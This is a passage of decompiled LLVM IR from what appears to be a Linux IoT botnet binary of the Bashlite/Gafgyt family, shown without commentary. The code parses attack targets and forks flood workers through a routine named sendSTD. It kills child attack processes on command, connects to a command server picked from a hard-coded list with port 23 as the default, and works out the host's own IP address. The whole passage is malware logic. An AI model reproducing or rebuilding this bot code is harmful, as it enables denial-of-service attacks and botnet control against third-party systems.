  %tmp181 = icmp slt i32 %v1_8050038, 1
  br i1 %tmp181, label %dec_label_pc_8050055, label %dec_label_pc_8050041

dec_label_pc_8050041:                             ; preds = %dec_label_pc_805002d
  %v1_8050044 = add i32 %tmp164, 12
  %v5_8050044 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050044, i1* %cf.global-to-local, align 1
  %v1_8050047 = inttoptr i32 %v1_8050044 to i32*
  %v2_8050047 = load i32, i32* %v1_8050047, align 4
  %v1_805004c = call i32 @atol(i32 %v2_8050047)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp182 = icmp slt i32 %v1_805004c, 1
  %tmp183 = icmp eq i1 %tmp182, false
  br i1 %tmp183, label %dec_label_pc_805006f, label %dec_label_pc_8050055

dec_label_pc_8050055:                             ; preds = %dec_label_pc_8050027, %dec_label_pc_8050041, %dec_label_pc_805002d
  %v0_8050055 = load i32, i32* @global_var_805c520.20, align 32
  %v2_8050065 = call i32 @sockprintf(i32 %v0_8050055, i32 ptrtoint ([27 x i8]* @global_var_8059b20.437 to i32))
  br label %dec_label_pc_80502ec

dec_label_pc_805006f:                             ; preds = %dec_label_pc_8050041
  %v1_8050072 = add i32 %tmp164, 4
  %v1_8050075 = inttoptr i32 %v1_8050072 to i32*
  %v2_8050075 = load i32, i32* %v1_8050075, align 4
  store i1 %v5_8050030, i1* %cf.global-to-local, align 1
  %v2_8050080 = load i32, i32* %v1_8050033, align 4
  %v1_8050085 = call i32 @atol(i32 %v2_8050080)
  store i1 %v5_8050044, i1* %cf.global-to-local, align 1
  %v2_8050093 = load i32, i32* %v1_8050047, align 4
  %v1_8050098 = call i32 @atol(i32 %v2_8050093)
  %v2_80500ae = inttoptr i32 %v2_8050075 to i8*
  %v3_80500ae = call i32 @__GI_strchr(i8* %v2_80500ae, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80500b3 = icmp eq i32 %v3_80500ae, 0
  br i1 %v1_80500b3, label %dec_label_pc_805011c, label %dec_label_pc_80500b7

dec_label_pc_80500b7:                             ; preds = %dec_label_pc_805006f
  store i32 %v2_8050075, i32* @eax, align 4
  %v2_80500c5 = call i32 @__GI_strtok(i32 %v2_8050075, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805011420 = icmp eq i32 %v2_80500c5, 0
  %v1_805011827 = icmp eq i1 %v4_805011420, false
  br i1 %v1_805011827, label %dec_label_pc_80500cf, label %dec_label_pc_805014e

dec_label_pc_80500cf:                             ; preds = %dec_label_pc_80500b7, %dec_label_pc_80500fd
  %storemerge1528 = phi i32 [ %v2_805010c, %dec_label_pc_80500fd ], [ %v2_80500c5, %dec_label_pc_80500b7 ]
  %v0_80500cf = call i32 @listFork()
  store i32 %v0_80500cf, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80500d4 = icmp eq i32 %v0_80500cf, 0
  %v1_80500d6 = icmp eq i1 %v1_80500d4, false
  br i1 %v1_80500d6, label %dec_label_pc_80500fd, label %dec_label_pc_80500d8

dec_label_pc_80500d8:                             ; preds = %dec_label_pc_80500cf
  %v3_80500ec = call i32 @sendSTD(i32 %storemerge1528, i32 %v1_8050085, i32 %v1_8050098)
  %v1_80500f8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80500fd:                             ; preds = %dec_label_pc_80500cf
  %v2_805010c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050114 = icmp eq i32 %v2_805010c, 0
  %v1_8050118 = icmp eq i1 %v4_8050114, false
  br i1 %v1_8050118, label %dec_label_pc_80500cf, label %dec_label_pc_805014e

dec_label_pc_805011c:                             ; preds = %dec_label_pc_805006f
  %v0_805011c = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050121 = icmp eq i32 %v0_805011c, 0
  %v1_8050123 = icmp eq i1 %v1_8050121, false
  br i1 %v1_8050123, label %dec_label_pc_80502ec, label %dec_label_pc_8050129

dec_label_pc_8050129:                             ; preds = %dec_label_pc_805011c
  %v3_805013d = call i32 @sendSTD(i32 %v2_8050075, i32 %v1_8050085, i32 %v1_8050098)
  %v1_8050149 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_805014e:                             ; preds = %dec_label_pc_80500fd, %dec_label_pc_80500b7, %dec_label_pc_804ffdc
  %v2_8050151 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_805016e = inttoptr i32 %v2_8050151 to i8*
  %v7_8050180 = call i32 @_strncmp(i8* %v4_805016e, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059b3b.438, i32 0, i32 0), i32 9)
  %v8_8050180 = urem i32 %v7_8050180, 2
  %v9_8050180 = icmp eq i32 %v8_8050180, 0
  %v0_8050182 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050182 = or i1 %v0_8050182, %v9_8050180
  %v3_8050182 = zext i1 %v2_8050182 to i32
  %v4_8050182 = load i32, i32* @edx, align 4
  %v5_8050182 = and i32 %v4_8050182, -256
  %v6_8050182 = or i32 %v3_8050182, %v5_8050182
  %v7_8050182 = xor i32 %v6_8050182, 1
  store i32 %v7_8050182, i32* @edx, align 4
  %v1_805018a = trunc i32 %v7_8050182 to i8
  %v3_805018a = zext i1 %v0_8050182 to i8
  %v15_805018a = icmp eq i8 %v1_805018a, %v3_805018a
  store i1 false, i1* @cf, align 1
  %v1_8050193 = icmp eq i1 %v15_805018a, false
  br i1 %v1_8050193, label %dec_label_pc_8050299, label %dec_label_pc_8050202

dec_label_pc_80501a9:                             ; preds = %dec_label_pc_805023f, %dec_label_pc_8050202
  %v2_80501ac = mul i32 %storemerge1, 4
  %v9_80501ac = and i32 %storemerge1, 1073741824
  %v10_80501ac = icmp ne i32 %v9_80501ac, 0
  store i32 %v2_80501ac, i32* %edx.global-to-local, align 4
  %v0_80501b1 = load i32, i32* @global_var_80627b4.36, align 4
  %v2_80501b6 = add i32 %v0_80501b1, %v2_80501ac
  %v1_80501b9 = inttoptr i32 %v2_80501b6 to i32*
  %v2_80501b9 = load i32, i32* %v1_80501b9, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80501bb = icmp eq i32 %v2_80501b9, 0
  br i1 %v1_80501bb, label %dec_label_pc_80501ff, label %dec_label_pc_80501bf

dec_label_pc_80501bf:                             ; preds = %dec_label_pc_80501a9
  store i1 %v10_80501ac, i1* %cf.global-to-local, align 1
  store i32 %v2_80501ac, i32* %edx.global-to-local, align 4
  %v2_80501cf = load i32, i32* %v1_80501b9, align 4
  store i32 %v2_80501cf, i32* @ebx, align 4
  %v0_80501d1 = call i32 @__libc_getpid()
  %v0_80501d6 = load i32, i32* @ebx, align 4
  %v7_80501d6 = icmp ult i32 %v0_80501d6, %v0_80501d1
  store i1 %v7_80501d6, i1* %cf.global-to-local, align 1
  %v12_80501d6 = icmp eq i32 %v0_80501d6, %v0_80501d1
  br i1 %v12_80501d6, label %dec_label_pc_80501ff, label %dec_label_pc_80501da

dec_label_pc_80501da:                             ; preds = %dec_label_pc_80501bf
  store i1 %v10_80501ac, i1* %cf.global-to-local, align 1
  store i32 %v2_80501ac, i32* %edx.global-to-local, align 4
  %v0_80501e2 = load i32, i32* @global_var_80627b4.36, align 4
  %v2_80501e7 = add i32 %v0_80501e2, %v2_80501ac
  %v1_80501ea = inttoptr i32 %v2_80501e7 to i32*
  %v2_80501ea = load i32, i32* %v1_80501ea, align 4
  %v2_80501f7 = call i32 @kill(i32 %v2_80501ea, i32 9)
  %v4_80501fc = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_80501ff

dec_label_pc_80501ff:                             ; preds = %dec_label_pc_80501bf, %dec_label_pc_80501a9, %dec_label_pc_80501da
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80501a9 ], [ %stack_var_-28.1, %dec_label_pc_80501bf ], [ %v4_80501fc, %dec_label_pc_80501da ]
  %v4_80501ff = add i32 %storemerge1, 1
  br label %dec_label_pc_8050202

dec_label_pc_8050202:                             ; preds = %dec_label_pc_805014e, %dec_label_pc_80501ff
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80501ff ], [ 0, %dec_label_pc_805014e ]
  %storemerge1 = phi i32 [ %v4_80501ff, %dec_label_pc_80501ff ], [ 0, %dec_label_pc_805014e ]
  store i32 0, i32* @edi, align 4
  %v0_8050216 = load i32, i32* @global_var_805c528.34, align 8
  %v0_805021b = load i32, i32* @global_var_805c52c.35, align 4
  store i32 %v0_805021b, i32* %edx.global-to-local, align 4
  %v10_8050233 = icmp ne i32 %v0_805021b, 0
  store i1 %v10_8050233, i1* %cf.global-to-local, align 1
  br i1 %v10_8050233, label %dec_label_pc_80501a9, label %dec_label_pc_805023f

dec_label_pc_805023f:                             ; preds = %dec_label_pc_8050202
  store i32 %v0_8050216, i32* @esi, align 4
  %v10_8050253 = icmp ult i32 %storemerge1, %v0_8050216
  store i1 %v10_8050253, i1* %cf.global-to-local, align 1
  br i1 %v10_8050253, label %dec_label_pc_80501a9, label %dec_label_pc_805025f

dec_label_pc_805025f:                             ; preds = %dec_label_pc_805023f
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp184 = icmp slt i32 %stack_var_-28.1, 1
  %v0_8050284 = load i32, i32* @global_var_805c520.20, align 32
  br i1 %tmp184, label %dec_label_pc_8050284, label %dec_label_pc_8050265

dec_label_pc_8050265:                             ; preds = %dec_label_pc_805025f
  store i32 %v0_8050284, i32* %edx.global-to-local, align 4
  %v2_805027d = call i32 @sockprintf(i32 %v0_8050284, i32 ptrtoint ([11 x i8]* @global_var_8059b44.439 to i32))
  br label %dec_label_pc_8050299

dec_label_pc_8050284:                             ; preds = %dec_label_pc_805025f
  %v2_8050294 = call i32 @sockprintf(i32 %v0_8050284, i32 ptrtoint ([13 x i8]* @global_var_8059b4f.440 to i32))
  br label %dec_label_pc_8050299

dec_label_pc_8050299:                             ; preds = %dec_label_pc_805014e, %dec_label_pc_8050265, %dec_label_pc_8050284
  %v2_805029c = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80502b9 = inttoptr i32 %v2_805029c to i8*
  store i32 ptrtoint ([10 x i8]* @global_var_8059b5c.441 to i32), i32* @edi, align 4
  %v7_80502cb = call i32 @_strncmp(i8* %v4_80502b9, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059b5c.441, i32 0, i32 0), i32 10)
  %v8_80502cb = urem i32 %v7_80502cb, 2
  %v9_80502cb = icmp eq i32 %v8_80502cb, 0
  %v0_80502cd = load i1, i1* @cf, align 1
  %v2_80502cd = or i1 %v0_80502cd, %v9_80502cb
  %v3_80502cd = zext i1 %v2_80502cd to i32
  %v4_80502cd = load i32, i32* @edx, align 4
  %v5_80502cd = and i32 %v4_80502cd, -256
  %v6_80502cd = or i32 %v3_80502cd, %v5_80502cd
  %v7_80502cd = xor i32 %v6_80502cd, 1
  store i32 %v7_80502cd, i32* %edx.global-to-local, align 4
  %v1_80502d5 = trunc i32 %v7_80502cd to i8
  %v3_80502d5 = zext i1 %v0_80502cd to i8
  %v4_80502d5 = sub nsw i8 %v1_80502d5, %v3_80502d5
  %v15_80502d5 = icmp eq i8 %v4_80502d5, 0
  %v2_80502d9 = sext i8 %v4_80502d5 to i32
  store i32 %v2_80502d9, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80502de = icmp eq i1 %v15_80502d5, false
  br i1 %v1_80502de, label %dec_label_pc_80502ec, label %dec_label_pc_80502e0

dec_label_pc_80502e0:                             ; preds = %dec_label_pc_8050299
  %v1_80502e7 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80502ec

dec_label_pc_80502ec:                             ; preds = %dec_label_pc_804f87d, %dec_label_pc_804f814, %dec_label_pc_804fdba, %dec_label_pc_804fd98, %dec_label_pc_804fbcd, %dec_label_pc_8050299, %dec_label_pc_805011c, %dec_label_pc_804ffaa, %dec_label_pc_804fdd3, %dec_label_pc_804fda2, %dec_label_pc_804fcc3, %dec_label_pc_804f89f, %dec_label_pc_804f44f, %dec_label_pc_804f3c0, %dec_label_pc_8050055, %dec_label_pc_804fed6, %dec_label_pc_804f9d1, %dec_label_pc_804f6f5, %dec_label_pc_804f5bb, %dec_label_pc_804f484, %dec_label_pc_804f307, %dec_label_pc_804f2a6, %dec_label_pc_80502e0
  %v0_80502f6 = phi i32 [ %v1_804fdc5, %dec_label_pc_804fdba ], [ %v2_804fd8d, %dec_label_pc_804fd98 ], [ %v2_804fbc2, %dec_label_pc_804fbcd ], [ %v2_80502d9, %dec_label_pc_8050299 ], [ %v0_805011c, %dec_label_pc_805011c ], [ %v0_804ffaa, %dec_label_pc_804ffaa ], [ %v0_804fdd3, %dec_label_pc_804fdd3 ], [ %v1_804fdad, %dec_label_pc_804fda2 ], [ %v0_804fcc3, %dec_label_pc_804fcc3 ], [ %v0_804f89f, %dec_label_pc_804f89f ], [ %v0_804f44f, %dec_label_pc_804f44f ], [ 0, %dec_label_pc_804f3c0 ], [ %v2_8050065, %dec_label_pc_8050055 ], [ %v2_804fee6, %dec_label_pc_804fed6 ], [ %v2_804f9e1, %dec_label_pc_804f9d1 ], [ %v2_804f705, %dec_label_pc_804f6f5 ], [ %v2_804f5dd, %dec_label_pc_804f5bb ], [ %v1_804f45c, %dec_label_pc_804f484 ], [ %v2_804f321, %dec_label_pc_804f307 ], [ %v2_804f2b6, %dec_label_pc_804f2a6 ], [ %v1_80502e7, %dec_label_pc_80502e0 ], [ %v2_804f822, %dec_label_pc_804f814 ], [ %v2_804f88c, %dec_label_pc_804f87d ]
  %v0_80502ec = load i32, i32* @esp, align 4
  %v5_80502ec = icmp ugt i32 %v0_80502ec, -381
  store i1 %v5_80502ec, i1* %cf.global-to-local, align 1
  %v2_80502f2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80502f2, i32* @ebx, align 4
  store i32 %v0_804f257, i32* @esi, align 4
  store i32 %v0_804f256, i32* @edi, align 4
  ret i32 %v0_80502f6

; uselistorder directives
  uselistorder i1 %v0_80502cd, { 1, 0 }
  uselistorder i32 %v0_8050284, { 2, 1, 0 }
  uselistorder i32 %v0_8050216, { 1, 0 }
  uselistorder i32 %storemerge1, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 1, 3, 2 }
  uselistorder i32 %v2_80501ac, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_8050182, { 1, 0 }
  uselistorder i32 %v2_805010c, { 1, 0 }
  uselistorder i32 %v1_8050098, { 1, 0 }
  uselistorder i32 %v1_8050085, { 1, 0 }
  uselistorder i32 %v2_8050075, { 2, 1, 0, 3 }
  uselistorder i1 %v0_8050010, { 1, 0 }
  uselistorder i32 %v2_804ff9a, { 1, 0 }
  uselistorder i32 %v1_804ff19, { 1, 0 }
  uselistorder i32 %v1_804ff06, { 1, 0 }
  uselistorder i32 %v2_804fef6, { 2, 1, 0, 3 }
  uselistorder i1 %v0_804fe91, { 1, 0 }
  uselistorder i32 %v1_804fe19, { 1, 0 }
  uselistorder i1 %v0_804fd81, { 1, 0 }
  uselistorder i32 %v1_804fd09, { 1, 0 }
  uselistorder i32 %v1_804fc59, { 1, 0 }
  uselistorder i32* %v1_804fbdd, { 2, 0, 1, 3 }
  uselistorder i1 %v5_804fbda, { 2, 0, 1, 3 }
  uselistorder i1 %v0_804fbb6, { 1, 0 }
  uselistorder i32 %v7_804fbb4, { 1, 0 }
  uselistorder i32 %v2_804fb28, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 1, 0, 2 }
  uselistorder i32 %v2_804fa35, { 1, 0 }
  uselistorder i32 %v1_804fa27, { 1, 0 }
  uselistorder i32 %v1_804fa14, { 1, 0 }
  uselistorder i32 %v1_804fa01, { 1, 0 }
  uselistorder i32 %v2_804f9f1, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f998, { 1, 0 }
  uselistorder i32 %v1_804f993, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804f928, { 1, 0 }
  uselistorder i32 %v2_804f88c, { 0, 2, 1 }
  uselistorder i32 %v2_804f822, { 1, 0, 2 }
  uselistorder i32 %storemerge9, { 1, 0, 2 }
  uselistorder i32 %storemerge10186, { 1, 0 }
  uselistorder i32 %v1_804f777, { 2, 1, 0 }
  uselistorder i32 %v1_804f75e, { 1, 0 }
  uselistorder i32 %v1_804f74b, { 1, 0 }
  uselistorder i32 %v1_804f738, { 1, 0 }
  uselistorder i32 %v1_804f725, { 1, 0 }
  uselistorder i32 %v2_804f715, { 2, 1, 0, 3 }
  uselistorder i1 %v8_804f6db, { 1, 0, 2 }
  uselistorder i32 %v1_804f6d6, { 1, 0 }
  uselistorder i32 %v1_804f6d1, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804f6bf, { 1, 0 }
  uselistorder i32 %v1_804f6ba, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804f6a8, { 1, 0 }
  uselistorder i32 %v1_804f6a3, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804f61b, { 1, 0 }
  uselistorder i1 %v0_804f5a8, { 1, 0 }
  uselistorder i1 %v0_804f520, { 1, 0 }
  uselistorder i1 %v0_804f438, { 1, 0 }
  uselistorder i1 %v0_804f3ad, { 1, 0 }
  uselistorder i1 %v0_804f35f, { 1, 0 }
  uselistorder i1 %v0_804f2f4, { 1, 0 }
  uselistorder i1 %v0_804f293, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp164, { 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 12, 11, 13, 14, 17, 15, 16, 18, 19, 21, 20, 22, 23, 24 }
  uselistorder i1* %cf.global-to-local, { 2, 3, 4, 5, 10, 6, 7, 8, 9, 22, 11, 13, 12, 0, 14, 15, 16, 17, 18, 19, 20, 21, 23, 147, 24, 26, 25, 148, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 149, 46, 47, 48, 49, 50, 56, 51, 52, 53, 54, 55, 150, 57, 58, 59, 60, 61, 151, 62, 64, 63, 152, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 121, 89, 91, 90, 1, 92, 93, 94, 95, 96, 97, 146, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 123, 124, 126, 125, 127, 138, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 139, 140, 141, 142, 143, 144, 145 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8059611.306 to i32), { 3, 4, 2, 5, 1, 6, 0, 7, 8, 9, 10, 11 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 4, 2, 3, 1, 0, 5, 6 }
  uselistorder i32* inttoptr (i32 -21 to i32*), { 2, 0, 1, 3 }
  uselistorder i32* inttoptr (i32 -13 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* %arg2, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 3, 4, 5, 6, 7, 21, 22, 1, 23, 24, 0, 25, 26, 27, 28, 31, 30, 29, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 %arg1, { 11, 20, 10, 19, 9, 18, 8, 17, 0, 16, 7, 6, 15, 5, 14, 2, 4, 1, 13, 3, 12 }
  uselistorder label %dec_label_pc_80502ec, { 22, 5, 6, 14, 7, 15, 8, 2, 9, 3, 10, 4, 16, 11, 0, 1, 17, 18, 19, 12, 13, 20, 21 }
  uselistorder label %dec_label_pc_8050299, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050202, { 1, 0 }
  uselistorder label %dec_label_pc_80501ff, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80500cf, { 1, 0 }
  uselistorder label %dec_label_pc_8050055, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ff50, { 1, 0 }
  uselistorder label %dec_label_pc_804fed6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804fe5d, { 1, 0 }
  uselistorder label %dec_label_pc_804fc17, { 1, 0 }
  uselistorder label %dec_label_pc_804fb82, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804facf, { 1, 0 }
  uselistorder label %dec_label_pc_804fa93, { 1, 0 }
  uselistorder label %dec_label_pc_804fa62, { 1, 0 }
  uselistorder label %dec_label_pc_804f9d1, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804f9b7, { 1, 0 }
  uselistorder label %dec_label_pc_804f82c, { 1, 0 }
  uselistorder label %dec_label_pc_804f7f0, { 1, 0 }
  uselistorder label %dec_label_pc_804f7bf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f6f5, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804f401, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502f7 = load i32, i32* @ebp, align 4
  store i32 %v0_80502f7, i32* %stack_var_-4, align 4
  %v4_80502f7 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80502f7, i32* @ebp, align 4
  %v2_8050300 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_805031c = bitcast i32* %stack_var_-4104 to i8*
  %v4_805031c = call i32 @__GI_memset(i8* %v3_805031c, i32 0, i32 4096)
  %v0_8050321 = load i32, i32* @global_var_805c520.20, align 32
  %v1_8050326 = icmp eq i32 %v0_8050321, 0
  br i1 %v1_8050326, label %dec_label_pc_8050341, label %dec_label_pc_805032a

dec_label_pc_805032a:                             ; preds = %entry
  %v1_8050332 = call i32 @__libc_close(i32 %v0_8050321)
  store i32 0, i32* @global_var_805c520.20, align 32
  br label %dec_label_pc_8050341

dec_label_pc_8050341:                             ; preds = %entry, %dec_label_pc_805032a
  %v0_8050341 = load i32, i32* @global_var_805c19c.442, align 4
  %v1_8050346 = icmp eq i32 %v0_8050341, 0
  %v1_8050348 = icmp eq i1 %v1_8050346, false
  br i1 %v1_8050348, label %dec_label_pc_8050356, label %dec_label_pc_8050361

dec_label_pc_8050356:                             ; preds = %dec_label_pc_8050341
  %v1_805035b = add i32 %v0_8050341, 1
  br label %dec_label_pc_8050361

dec_label_pc_8050361:                             ; preds = %dec_label_pc_8050341, %dec_label_pc_8050356
  %storemerge = phi i32 [ %v1_805035b, %dec_label_pc_8050356 ], [ 0, %dec_label_pc_8050341 ]
  store i32 %storemerge, i32* @global_var_805c19c.442, align 4
  %v1_8050366 = mul i32 %storemerge, 4
  %v2_8050366 = add i32 %v1_8050366, ptrtoint ([16 x i8]** @global_var_805c198.443 to i32)
  %v3_8050366 = inttoptr i32 %v2_8050366 to i32*
  %v4_8050366 = load i32, i32* %v3_8050366, align 4
  store i32 %v4_8050366, i32* @eax, align 4
  %v3_805037a = call i32 @strcpy(i8* %v3_805031c, i32 %v4_8050366)
  %v3_8050397 = call i32 @__GI_strchr(i8* %v3_805031c, i32 58)
  %v1_805039c = icmp eq i32 %v3_8050397, 0
  br i1 %v1_805039c, label %dec_label_pc_80503db, label %dec_label_pc_80503a0

dec_label_pc_80503a0:                             ; preds = %dec_label_pc_8050361
  %v3_80503b1 = call i32 @__GI_strchr(i8* %v3_805031c, i32 58)
  %v1_80503b6 = add i32 %v3_80503b1, 1
  %v1_80503ba = call i32 @atol(i32 %v1_80503b6)
  %v3_80503d3 = call i32 @__GI_strchr(i8* %v3_805031c, i32 58)
  %v4_80503d3 = inttoptr i32 %v3_80503d3 to i8*
  store i8 0, i8* %v4_80503d3, align 1
  br label %dec_label_pc_80503db

dec_label_pc_80503db:                             ; preds = %dec_label_pc_8050361, %dec_label_pc_80503a0
  %stack_var_-8.0 = phi i32 [ 23, %dec_label_pc_8050361 ], [ %v1_80503ba, %dec_label_pc_80503a0 ]
  %v3_80503f2 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_80503f2, i32* @global_var_805c520.20, align 32
  %v4_805041e = call i32 @connectTimeout(i32 %v3_80503f2, i32 %v2_8050300, i32 %stack_var_-8.0, i32 30)
  %v1_8050423 = icmp eq i32 %v4_805041e, 0
  %. = zext i1 %v1_8050423 to i32
  %v2_8050443 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050443, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80503db, { 1, 0 }
  uselistorder label %dec_label_pc_8050361, { 1, 0 }
  uselistorder label %dec_label_pc_8050341, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050445 = load i32, i32* @ebp, align 4
  store i32 %v0_8050445, i32* %stack_var_-4, align 4
  %v5_8050465 = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_805046d = icmp eq i32 %v5_8050465, -1
  %v1_8050471 = icmp eq i1 %v13_805046d, false
  br i1 %v1_8050471, label %dec_label_pc_8050482, label %dec_label_pc_8050660

dec_label_pc_8050482:                             ; preds = %entry
  %v2_8050482 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_80504ad = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8059b66.444 to i32))
  %v3_80504bc = call i32 @htons(i16 53)
  %v5_80504dd = call i32 @__libc_connect(i32 %v5_8050465, i32 %v2_8050482, i32 16)
  %v13_80504e5 = icmp eq i32 %v5_80504dd, -1
  %v1_80504e9 = icmp eq i1 %v13_80504e5, false
  br i1 %v1_80504e9, label %dec_label_pc_80504fa, label %dec_label_pc_8050660

dec_label_pc_80504fa:                             ; preds = %dec_label_pc_8050482
  store i32 16, i32* %stack_var_-60, align 4
  %v2_8050501 = ptrtoint i32* %stack_var_-56 to i32
  %v2_8050504 = ptrtoint i32* %stack_var_-60 to i32
  %v5_8050515 = call i32 @__GI_getsockname(i32 %v5_8050465, i32 %v2_8050501, i32 %v2_8050504)
  %v13_805051d = icmp eq i32 %v5_8050515, -1
  %v1_8050521 = icmp eq i1 %v13_805051d, false
  br i1 %v1_8050521, label %dec_label_pc_8050532, label %dec_label_pc_8050660

dec_label_pc_8050532:                             ; preds = %dec_label_pc_80504fa
  %v5_8050549 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8059b6e.445, i32 0, i32 0), i32 0)
  %v2_80505ae = ptrtoint i8* %stack_var_-4156 to i32
  %v5_80505c634 = call i32 @fdgets(i32 %v2_80505ae, i32 4096, i32 %v5_8050549)
  %v1_80505cb35 = icmp eq i32 %v5_80505c634, 0
  %v1_80505cd37 = icmp eq i1 %v1_80505cb35, false
  br i1 %v1_80505cd37, label %dec_label_pc_8050553, label %dec_label_pc_80505cf

dec_label_pc_8050553:                             ; preds = %dec_label_pc_8050532, %dec_label_pc_805058d
  %v5_8050564 = call i32 @strstr(i32 %v2_80505ae, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059b7e.446, i32 0, i32 0))
  %v1_8050569 = icmp eq i32 %v5_8050564, 0
  br i1 %v1_8050569, label %dec_label_pc_805058d, label %dec_label_pc_805057b

dec_label_pc_8050578:                             ; preds = %dec_label_pc_805057b
  %v4_805057b = ptrtoint i8* %storemerge5 to i32
  %v5_8050578 = add i32 %v4_805057b, 1
  %v22_8050578 = inttoptr i32 %v5_8050578 to i8*
  br label %dec_label_pc_805057b

dec_label_pc_805057b:                             ; preds = %dec_label_pc_8050553, %dec_label_pc_8050578
  %storemerge5 = phi i8* [ %v22_8050578, %dec_label_pc_8050578 ], [ %stack_var_-4156, %dec_label_pc_8050553 ]
  %v2_805057e = load i8, i8* %storemerge5, align 1
  %v10_8050581 = icmp eq i8 %v2_805057e, 9
  %v1_8050583 = icmp eq i1 %v10_8050581, false
  br i1 %v1_8050583, label %dec_label_pc_8050578, label %dec_label_pc_8050585

dec_label_pc_8050585:                             ; preds = %dec_label_pc_805057b
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_80505cf

dec_label_pc_805058d:                             ; preds = %dec_label_pc_8050553
